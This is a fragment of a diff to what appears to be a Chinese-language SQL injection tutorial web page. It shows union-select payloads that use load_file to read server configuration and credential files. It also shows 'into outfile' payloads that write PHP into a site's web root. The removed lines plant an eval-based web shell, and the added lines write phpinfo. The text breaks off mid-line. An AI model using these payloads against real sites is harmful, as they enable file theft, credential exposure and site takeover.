@@ -359,10 +359,9 @@ benchmark是用于测试函数性能的，它是将表达式expr执行count次�
 ?id=1' union select 1,2,load_file('/etc/init.d/httpd')  得到web安装路径
 ?id=1' union select 1,2,load_file('/etc/apache/conf/httpd.conf')  读取密码文件
 ?id=1' union select 1,2,load_file('/site/xxx.com/conf/conn.inc.php')    0x01 into outfile  条件：  1. 要有file_priv权限 2. 知道网站绝对路径 3. 要能用union 4. 对web目录有写权限 5. 没有过滤单引号   一般方法
-当知道路径时，可以直接用?id=1 union select &ldquo;&lt;?php @eval($_POST[&lsquo;c&rsquo;]);?&gt;&rdquo; into outfile(&ldquo;C:/phpStudy/WWW/a.php&rdquo;)
- 其他方法
- 登陆phpMyAdmin
-use test; 选择数据库为test create table aaa(bbb varchar(64)); 在数据库中创建一个表aaa insert into aaa values(&quot;&lt;?
+当知道路径时，可以直接用  id=1 union select &quot;&lt;? phpinfo();&gt;&quot; into outfile(&quot;C:/phpStudy/WWW/a.php&quot;)
+或者
+id=1 into outfile 'C:/phpStudy/WWW/a.
     </p>
 
     
